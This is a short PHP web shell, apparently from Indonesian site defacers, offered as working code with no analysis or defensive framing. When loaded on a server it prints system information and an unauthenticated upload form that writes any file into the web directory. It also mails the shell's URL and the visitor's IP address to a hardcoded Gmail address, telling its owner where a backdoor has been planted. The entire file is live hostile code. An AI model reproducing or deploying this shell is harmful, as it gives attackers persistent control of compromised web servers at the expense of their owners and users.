<?php
error_reporting(0);
echo '<title>Infra</title>';
echo '<center><b><h1>Infra</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></b>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>SUKSES ! :)'; }
else { echo '<b>GAGAL JINK !'; }
}
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'kitakayaa@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "Tuyul hari ini", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
